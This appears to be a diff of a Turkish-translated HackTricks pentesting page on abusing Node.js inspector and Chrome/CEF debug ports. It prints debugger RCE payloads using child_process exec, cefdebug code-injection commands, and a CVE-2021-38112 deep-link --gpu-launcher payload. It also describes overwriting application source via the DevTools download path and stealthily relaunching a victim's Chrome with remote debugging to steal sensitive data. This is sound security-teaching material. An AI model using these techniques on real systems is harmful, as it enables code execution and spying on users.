@@ -1,30 +1,31 @@
-# Node inspector/CEF debug kötüye kullanımı
+# Node inspector/CEF debug abuse
+
+{% hint style="success" %}
+AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>
+<summary>HackTricks'i Destekleyin</summary>
 
-HackTricks'i desteklemenin diğer yolları:
-
-* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
-* **Hacking püf noktalarınızı paylaşarak PR göndererek HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
+* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
+* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
+{% endhint %}
 
 ## Temel Bilgiler
 
-[Dökümantasyondan](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Bir Node.js işlemi `--inspect` anahtarıyla başlatıldığında, bir hata ayıklama istemcisi dinler. **Varsayılan olarak**, host ve port **`127.0.0.1:9229`** adresinde dinleyecektir. Her işleme ayrıca **benzersiz** bir **UUID** atanır.
+[Belgelerden](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): `--inspect` anahtarı ile başlatıldığında, bir Node.js süreci bir hata ayıklama istemcisini dinler. **Varsayılan olarak**, **`127.0.0.1:9229`** adresinde dinleyecektir. Her sürece de **benzersiz** bir **UUID** atanır.
 
-İnceleyici istemcilerin bağlanmak için host adresini, portu ve UUID'yi bilmeleri ve belirtmeleri gerekir. Tam bir URL şuna benzer bir şey olacaktır: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.
+İnspektör istemcileri, bağlanmak için host adresini, portu ve UUID'yi bilmek ve belirtmek zorundadır. Tam bir URL şu şekilde görünecektir: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.
 
 {% hint style="warning" %}
-**Hata ayıklama aracının Node.js yürütme ortamına tam erişimi olduğundan**, bu porta bağlanabilen kötü niyetli bir aktör, Node.js işlemi adına keyfi kodları yürütebilir (**potansiyel ayrıcalık yükseltme**).
+**Hata ayıklayıcı, Node.js yürütme ortamına tam erişime sahip olduğundan**, bu porta bağlanabilen kötü niyetli bir aktör, Node.js süreci adına rastgele kod çalıştırabilir (**potansiyel ayrıcalık yükseltme**).
 {% endhint %}
 
-İnceleyiciyi başlatmanın birkaç yolu vardır:
+Bir inspektörü başlatmanın birkaç yolu vardır:
 ```bash
 node --inspect app.js #Will run the inspector in port 9229
 node --inspect=4444 app.js #Will run the inspector in port 4444
@@ -35,50 +36,51 @@ node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and po
 node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
 # Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
 ```
-İncelenen bir işlem başlatıldığında şöyle bir şey görünecektir:
+When you start an inspected process something like this will appear:  
+Bir denetlenen işlem başlattığınızda, şöyle bir şey görünecektir:
 ```
 Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
 For help, see: https://nodejs.org/en/docs/inspector
 ```
-**CEF** (**Chromium Embedded Framework**) gibi **CEF** tabanlı işlemler, hata ayıklama aracını açmak için `--remote-debugging-port=9222` parametresini kullanmalıdır (SSRF korumaları oldukça benzer kalır). Bununla birlikte, **NodeJS** hata ayıklama oturumu vermek yerine tarayıcı ile iletişim kurmak için [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) kullanırlar, bu tarayıcıyı kontrol etmek için bir arayüzdür, ancak doğrudan bir RCE yoktur.
+Processes based on **CEF** (**Chromium Embedded Framework**) gibi, **debugger**'ı açmak için `--remote-debugging-port=9222` parametresini kullanmaları gerekir (SSRF korumaları çok benzer kalır). Ancak, **NodeJS** **debug** oturumu vermek yerine, tarayıcı ile [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) kullanarak iletişim kuracaklardır, bu tarayıcıyı kontrol etmek için bir arayüzdür, ancak doğrudan bir RCE yoktur.
 
-Hata ayıklanan bir tarayıcı başlattığınızda şöyle bir şey görünecektir:
+Bir debug edilmiş tarayıcı başlattığınızda, şöyle bir şey görünecektir:
 ```
 DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
 ```
-### Tarayıcılar, WebSoketler ve aynı köken politikası <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>
+### Tarayıcılar, WebSocket'ler ve aynı köken politikası <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>
 
-Web siteleri bir web tarayıcısında WebSocket ve HTTP istekleri yapabilirler tarayıcı güvenlik modeli altında. **Benzersiz bir hata ayıklayıcı oturum kimliği almak için başlangıçta bir HTTP bağlantısı** gereklidir. **Aynı köken politikası**, web sitelerinin **bu HTTP bağlantısını** yapmasını engeller. [**DNS yeniden bağlama saldırılarına karşı ek güvenlik için**](https://en.wikipedia.org/wiki/DNS\_rebinding)**, Node.js bağlantı için 'Host' başlıklarının ya bir **IP adresi** ya da **`localhost`** ya da **`localhost6`** belirtmesini doğrular.
+Bir web tarayıcısında açılan web siteleri, tarayıcı güvenlik modeli altında WebSocket ve HTTP istekleri yapabilir. **Benzersiz bir hata ayıklayıcı oturum kimliği elde etmek için** **ilk bir HTTP bağlantısı** gereklidir. **Aynı köken politikası**, web sitelerinin **bu HTTP bağlantısını** yapmasını **engeller**. [**DNS yeniden bağlama saldırılarına**](https://en.wikipedia.org/wiki/DNS\_rebinding)** karşı ek güvenlik için,** Node.js, bağlantı için **'Host' başlıklarının** ya bir **IP adresi** ya da **`localhost`** veya **`localhost6`** olarak tam olarak belirtildiğini doğrular.
 
 {% hint style="info" %}
-Bu **güvenlik önlemleri, denetleyiciyi istismar etmeyi** ve **yalnızca bir HTTP isteği göndererek kod çalıştırmayı** (bu, bir SSRF zafiyetini istismar etmek suretiyle yapılabilir) **engeller**.
+Bu **güvenlik önlemleri, sadece bir HTTP isteği göndererek** kod çalıştırmak için **denetleyiciyi istismar etmeyi** engeller (bu, bir SSRF açığını istismar ederek yapılabilir).
 {% endhint %}
 
-### Çalışan işlemlerde denetleyiciyi başlatma
+### Çalışan süreçlerde denetleyiciyi başlatma
 
-Bir nodejs işlemine **SINYAL SIGUSR1** gönderebilirsiniz ve bu işlemi **varsayılan bağlantı noktasında denetleyiciyi başlatır**. Ancak, yeterli ayrıcalığa sahip olmanız gerektiğini unutmayın, bu nedenle bu size işlem içindeki bilgilere **öncelikli erişim sağlayabilir** ancak doğrudan bir ayrıcalık yükseltme sağlamaz.
+Çalışan bir nodejs sürecine **SIGUSR1 sinyalini** göndererek, **denetleyiciyi** varsayılan portta **başlatmasını** sağlayabilirsiniz. Ancak, yeterli ayrıcalıklara sahip olmanız gerektiğini unutmayın, bu size **süreç içindeki bilgilere ayrıcalıklı erişim** sağlayabilir ama doğrudan bir ayrıcalık yükseltmesi sağlamaz.
 ```bash
 kill -s SIGUSR1 <nodejs-ps>
 # After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
 ```
 {% hint style="info" %}
-Bu, **işlemi durdurup yeni bir tane başlatmak** `--inspect` ile bir seçenek olmadığı için **konteynerlerde** kullanışlıdır çünkü **konteyner** işlemle birlikte **sonlandırılacaktır**.
+Bu, **şu anda işlemi kapatıp yeni bir tane başlatmak** `--inspect` ile **bir seçenek olmadığı için** konteynerlerde faydalıdır çünkü **konteyner**, işlemle birlikte **öldürülecektir**.
 {% endhint %}
 
-### Denetleyiciye/hata ayıklayıcıya bağlanma
+### Denetleyici/hata ayıklayıcıya bağlanın
 
-Bir **Chromium tabanlı tarayıcıya** bağlanmak için, sırasıyla Chrome veya Edge için `chrome://inspect` veya `edge://inspect` URL'lerine erişilebilir. Hedef ana bilgisayar ve bağlantı noktasının doğru bir şekilde listelendiğinden emin olmak için Yapılandır düğmesine tıklanmalıdır. Resim, Uzaktan Kod Yürütme (RCE) örneğini göstermektedir:
+**Chromium tabanlı bir tarayıcıya** bağlanmak için, Chrome veya Edge için sırasıyla `chrome://inspect` veya `edge://inspect` URL'leri erişilebilir. Yapılandırma düğmesine tıklanarak, **hedef ana bilgisayar ve portun** doğru bir şekilde listelendiğinden emin olunmalıdır. Görüntü, Uzaktan Kod Yürütme (RCE) örneğini göstermektedir:
 
 ![](<../../.gitbook/assets/image (674).png>)
 
-**Komut satırı** kullanılarak bir hata ayıklayıcıya/denetleyiciye bağlanabilirsiniz:
+**Komut satırını** kullanarak bir hata ayıklayıcıya/denetleyiciye şu şekilde bağlanabilirsiniz:
 ```bash
 node inspect <ip>:<port>
 node inspect 127.0.0.1:9229
 # RCE example from debug console
 debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
 ```
-The tool [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), yerel olarak çalışan **denetleyicileri bulmayı** ve bunlara **kod enjekte etmeyi** sağlar.
+Araç [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), yerel olarak çalışan **denetleyicileri bulmayı** ve onlara **kod enjekte etmeyi** sağlar.
 ```bash
 #List possible vulnerable sockets
 ./cefdebug.exe
@@ -88,16 +90,16 @@ The tool [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefd
 ./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
 ```
 {% hint style="info" %}
-**NodeJS RCE saldırıları**, bir tarayıcıya [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) aracılığıyla bağlandığınızda çalışmayacaktır (ilginç şeyler yapmak için API'yi kontrol etmeniz gerekmektedir).
+Not edin ki **NodeJS RCE istismarları** [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) üzerinden bir tarayıcıya bağlı olduğunda çalışmayacaktır (onunla yapacak ilginç şeyler bulmak için API'yi kontrol etmeniz gerekir).
 {% endhint %}
 
-## NodeJS Hata Ayıklayıcı/İnceleyici'de Uzaktan Kod Çalıştırma
+## NodeJS Hata Ayıklayıcı/Denetleyici'de RCE
 
 {% hint style="info" %}
-Eğer [**Electron'da XSS ile RCE almayı**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/) arıyorsanız, lütfen bu sayfaya bakınız.
+Eğer buraya [**Electron'da bir XSS'den RCE nasıl alınır**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/) diye bakmak için geldiyseniz, lütfen bu sayfayı kontrol edin.
 {% endhint %}
 
-Bir Node **inceleyici**ne bağlandığınızda **RCE** elde etmenin bazı yaygın yolları şunları içerir (görünüşe göre bu, **Chrome DevTools protokolüne bağlı bir bağlantıda çalışmayacaktır**):
+Node **denetleyici**'ye **bağlandığınızda** **RCE** elde etmenin bazı yaygın yolları, (bu **Chrome DevTools protokolüne bağlantıda çalışmayacak gibi görünüyor**) bir şey kullanmaktır:
 ```javascript
 process.mainModule.require('child_process').exec('calc')
 window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
@@ -106,22 +108,24 @@ Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
 ```
 ## Chrome DevTools Protocol Payloads
 
-API'yi buradan kontrol edebilirsiniz: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
-Bu bölümde, bu protokolü kötüye kullanmak için insanların kullandığı ilginç şeyleri listeleyeceğim.
+API'yi burada kontrol edebilirsiniz: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
+Bu bölümde, bu protokolü istismar etmek için insanların kullandığı ilginç şeyleri listeleyeceğim.
 
-### Derin Bağlantılar Aracılığıyla Parametre Enjeksiyonu
+### Derin Bağlantılar Üzerinden Parametre Enjeksiyonu
 
-[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino Security, CEF tabanlı bir uygulamanın sistemde özel bir URI (workspaces://) kaydettiğini keşfetti ve ardından tam URI'yi alan ve ardından o URI'den kısmen oluşturulan bir yapılandırmayla CEF tabanlı uygulamayı başlattığını tespit etti.
+[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino güvenliği, CEF tabanlı bir uygulamanın sistemde **özel bir URI** (workspaces://) kaydettiğini ve tam URI'yi aldığı ve ardından bu URI'den kısmen yapılandırılan bir konfigürasyonla **CEF tabanlı uygulamayı başlattığını** keşfetti.
 
-URI parametrelerinin URL çözümlendiği ve CEF temel uygulamasını başlatmak için kullanıldığı keşfedildi, bu da bir kullanıcının **komut satırına** bayrak **`--gpu-launcher`** enjekte etmesine ve keyfi şeyler yürütmesine olanak tanıdı.
+URI parametrelerinin URL kodlaması yapılarak CEF temel uygulamasını başlatmak için kullanıldığı, bir kullanıcının **komut satırında** **`--gpu-launcher`** bayrağını **enjekte etmesine** ve rastgele şeyler çalıştırmasına olanak tanıdığı keşfedildi.
 
-Bu nedenle, şu gibi bir yük:
+Yani, şöyle bir yük:
 ```
 workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
 ```
-### Dosya Üzerine Yazma
+calc.exe'yi çalıştıracak.
 
-İndirilen dosyaların kaydedileceği klasörü değiştirin ve sıkça kullanılan uygulamanın kaynak kodunu **kötü amaçlı kodunuzla** üzerine yazacak bir dosya indirin.
+### Dosyaları Üzerine Yaz
+
+**İndirilen dosyaların kaydedileceği** klasörü değiştirin ve uygulamanın sık kullanılan **kaynak kodunu** **kötü niyetli kodunuzla** **üzerine yazmak** için bir dosya indirin.
 ```javascript
 ws = new WebSocket(url); //URL of the chrome devtools service
 ws.send(JSON.stringify({
@@ -133,15 +137,15 @@ downloadPath: '/code/'
 }
 }));
 ```
-### Webdriver RCE ve veri sızdırma
+### Webdriver RCE ve exfiltrasyon
 
-Bu yazıya göre: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) RCE elde etmek ve theriver'dan iç sayfaları sızdırmak mümkündür.
+Bu gönderiye göre: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) RCE elde etmek ve iç sayfaları theriver'dan exfiltrate etmek mümkündür.
 
-### Saldırı Sonrası
+### Post-Exploitation
 
-Gerçek bir ortamda ve bir kullanıcının Chrome/Chromium tabanlı tarayıcı kullanan bir PC'sini ele geçirdikten **sonra**, Chrome işlemi başlatabilir ve hata ayıklama etkinleştirilmiş ve hata ayıklama bağlantı noktasını yönlendirerek hata ayıklama bağlantı noktasına erişebilirsiniz. Bu şekilde **kurbanın Chrome'da yaptığı her şeyi inceleyebilir ve hassas bilgileri çalabilirsiniz**.
+Gerçek bir ortamda ve **bir kullanıcı PC'sini ele geçirdikten sonra** Chrome/Chromium tabanlı bir tarayıcı kullanan, **hata ayıklama etkinleştirilmiş ve hata ayıklama portunu yönlendirilmiş** bir Chrome süreci başlatabilirsiniz. Bu şekilde, **kurbanın Chrome ile yaptığı her şeyi inceleyebilir ve hassas bilgileri çalabilirsiniz**.
 
-Gizlilik sağlayan yol, **her Chrome işlemini sonlandırmak** ve ardından şuna benzer bir şey çağırmaktır:
+Gizli yol, **her Chrome sürecini sonlandırmak** ve ardından şöyle bir şey çağırmaktır:
 ```bash
 Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
 ```
@@ -158,16 +162,17 @@ Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
 * [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
 * [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
 
+{% hint style="success" %}
+AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>A'dan Z'ye AWS hackleme konusunda bilgi edinin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>HackTricks'i Destekleyin</summary>
 
-HackTricks'ı desteklemenin diğer yolları:
-
-* **Şirketinizi HackTricks'te reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** istiyorsanız [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'ı takip edin.
-* **Hacking püf noktalarınızı paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
+* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
+* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
+{% endhint %}
